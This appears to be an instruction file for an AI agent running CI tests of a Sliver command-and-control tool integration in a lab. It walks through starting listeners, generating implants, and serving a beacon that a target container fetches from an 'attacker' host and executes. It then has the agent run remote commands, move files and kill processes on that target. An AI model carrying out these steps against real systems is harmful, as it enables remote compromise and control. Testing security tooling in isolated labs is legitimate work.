# Pi-Sliver Extension Test Suite

You MUST execute every test below using the actual sliver_* tools. Do NOT describe the tests. Do NOT summarize. Do NOT write example output. Call each tool, check the result, and print exactly `[PASS] tool_name` or `[FAIL] tool_name: error` after each one.

Execute each test in order. For every test, print exactly one line with `[PASS]` or `[FAIL]` and the tool name.
If a tool returns an error, print `[FAIL] tool_name: error_message` and continue to the next test.

IMPORTANT: After EVERY tool call, print the result before printing PASS/FAIL. Show the actual JSON response. For example:

```
Calling sliver_version...
Result: {"Major":1,"Minor":7,"Patch":3}
[PASS] sliver_version
```

Do NOT skip showing the result. Print it.

You are running in CI. The Sliver server is on localhost:31337. The target machine is at the hostname `target`.

## Phase 1: Server discovery (no target needed)

### Test 1 — sliver_version
Call `sliver_version`. Verify the response contains a version object with Major, Minor, Patch fields.
`[PASS] sliver_version` if version is non-null, `[FAIL]` otherwise.

### Test 2 — sliver_status
Call `sliver_status`. Verify it returns config_path, operator, version, and counts.
`[PASS] sliver_status` if all fields present.

### Test 3 — sliver_operators
Call `sliver_operators`. Verify it returns a list with at least one operator that is Online.
`[PASS] sliver_operators` if so.

### Test 4 — sliver_sessions (empty)
Call `sliver_sessions`. Should return `[]`.
`[PASS] sliver_sessions` if it's an empty array.

### Test 5 — sliver_beacons (empty)
Call `sliver_beacons`. Should return `[]`.
`[PASS] sliver_beacons` if it's an empty array.

### Test 6 — sliver_jobs
Call `sliver_jobs`. Should return a list (may be empty or have the daemon's default jobs).
`[PASS] sliver_jobs` if it returns an array.

## Phase 2: Listeners

### Test 7 — sliver_listener_mtls
Call `sliver_listener_mtls` with host=`0.0.0.0`, port=`8443`.
`[PASS] sliver_listener_mtls` if response contains a JobID.

### Test 8 — sliver_listener_http
Call `sliver_listener_http` with domain=`test`, host=`0.0.0.0`, port=`80`.
`[PASS] sliver_listener_http` if response contains a JobID.

### Test 9 — sliver_listener_https
Call `sliver_listener_https` with domain=`test`, host=`0.0.0.0`, port=`443`.
`[PASS] sliver_listener_https` if response contains a JobID.

### Test 10 — sliver_listener_dns
Call `sliver_listener_dns` with domains=`["test.local"]`, host=`0.0.0.0`, port=`5353`.
`[PASS] sliver_listener_dns` if response contains a JobID or an error about port binding (either is fine — we're testing the tool call works).

### Test 11 — sliver_jobs (should have listeners)
Call `sliver_jobs` again. Now there should be at least 2 jobs.
`[PASS] sliver_jobs_populated` if len >= 2.

### Test 12 — sliver_job_kill
Call `sliver_job_kill` with job_id set to the JobID from the DNS listener (or any job). Then call `sliver_jobs` to verify one fewer job.
`[PASS] sliver_job_kill` if the job was removed.

## Phase 3: Implant build

### Test 13 — sliver_implants (empty)
Call `sliver_implants`. Should return empty (no builds yet).
`[PASS] sliver_implants_empty` if it returns an empty array.

### Test 14 — sliver_implant_generate
Call `sliver_implant_generate` with:
- name: `ci-test-implant`
- os: `linux`
- arch: `amd64`
- format: `EXECUTABLE`
- c2_url: `http://127.0.0.1:80/test`
- is_beacon: `false`

`[PASS] sliver_implant_generate` if response contains local_path and bytes > 0.

### Test 15 — sliver_implants (populated)
Call `sliver_implants`. Should now contain `ci-test-implant` or its random name.
`[PASS] sliver_implants_populated` if array is non-empty.

### Test 16 — sliver_implant_regenerate
Call `sliver_implant_regenerate` with name set to the implant name from test 14.
`[PASS] sliver_implant_regenerate` if response contains local_path and bytes > 0.

### Test 17 — sliver_implant_delete
Call `sliver_implant_delete` with the same name.
`[PASS] sliver_implant_delete` if it returns successfully.

### Test 18 — sliver_implants (empty again)
Call `sliver_implants`. Should be empty again.
`[PASS] sliver_implants_deleted` if array is empty.

## Phase 4: Implant deployment and interaction

The target container is already polling `http://attacker:8888/implant` every 2 seconds. Generate an implant, serve it, and the target will auto-download and execute it.

### Test 19 — Generate and deploy implant to target
Generate a new implant with:
- name: `ci-target`
- os: `linux`
- arch: `amd64`
- c2_url: `http://attacker:80/ci-target` (hostname `attacker` is this container on the docker network)
- is_beacon: `true`
- beacon_interval_seconds: `5`

Then use `bash` to:
1. Start a Python HTTP server on port 8888: `python3 -m http.server 8888 --directory /tmp/pi-sliver &`
2. Create a symlink so the target can find it: `ln -sf /tmp/pi-sliver/IMPLANT_NAME /tmp/pi-sliver/implant` (replace IMPLANT_NAME with the actual random name from the generate response)
3. Wait 20 seconds for the target to download and execute the beacon: `sleep 20`

`[PASS] sliver_implant_deploy` if the implant was generated and symlink created.

### Test 20 — sliver_beacons (should have one)
Call `sliver_beacons`. Should now have one beacon from `target`.
`[PASS] sliver_beacons_callback` if hostname matches `target` or similar.

### Test 21 — sliver_exec
Use `sliver_exec` on the beacon to run `whoami`. 
`[PASS] sliver_exec` if stdout is non-empty.

### Test 22 — sliver_pwd
Call `sliver_pwd` on the beacon.
`[PASS] sliver_pwd` if it returns a path.

### Test 23 — sliver_ls
Call `sliver_ls` on the beacon with path `/tmp`.
`[PASS] sliver_ls` if it returns file listings.

### Test 24 — sliver_cd
Call `sliver_cd` on the beacon with path `/etc`.
`[PASS] sliver_cd` if successful.

### Test 25 — sliver_cat
Call `sliver_cat` on the beacon with path `/etc/hostname`.
`[PASS] sliver_cat` if stdout contains non-empty text.

### Test 26 — sliver_mkdir
Call `sliver_mkdir` on the beacon with path `/tmp/pi-sliver-test`.
`[PASS] sliver_mkdir` if successful.

### Test 27 — sliver_upload
Use `bash` to create a local test file: `echo "hello from ci" > /tmp/upload-test.txt`
Then call `sliver_upload` with local_path=`/tmp/upload-test.txt`, remote_path=`/tmp/pi-sliver-test/uploaded.txt`.
`[PASS] sliver_upload` if successful.

### Test 28 — sliver_download
Call `sliver_download` with remote_path=`/tmp/pi-sliver-test/uploaded.txt`.
`[PASS] sliver_download` if response contains local_path and bytes > 0.

### Test 29 — sliver_ps
Call `sliver_ps` on the beacon.
`[PASS] sliver_ps` if it returns a process list.

### Test 30 — sliver_ifconfig
Call `sliver_ifconfig` on the beacon.
`[PASS] sliver_ifconfig` if it returns network interface info.

### Test 31 — sliver_netstat
Call `sliver_netstat` on the beacon.
`[PASS] sliver_netstat` if it returns connection info.

### Test 32 — sliver_rm
Call `sliver_rm` on the beacon with path=`/tmp/pi-sliver-test`, recursive=`true`.
`[PASS] sliver_rm` if successful.

### Test 33 — sliver_terminate
Find the implant's own PID from `sliver_ps` output, then call `sliver_terminate` with that PID.
`[PASS] sliver_terminate` if successful.

## Summary

After all tests, print a final line:
```
=== RESULTS: PASSED=N FAILED=M TOTAL=T ===
```
where N is the number of `[PASS]` lines, M is the number of `[FAIL]` lines, and T is the total.
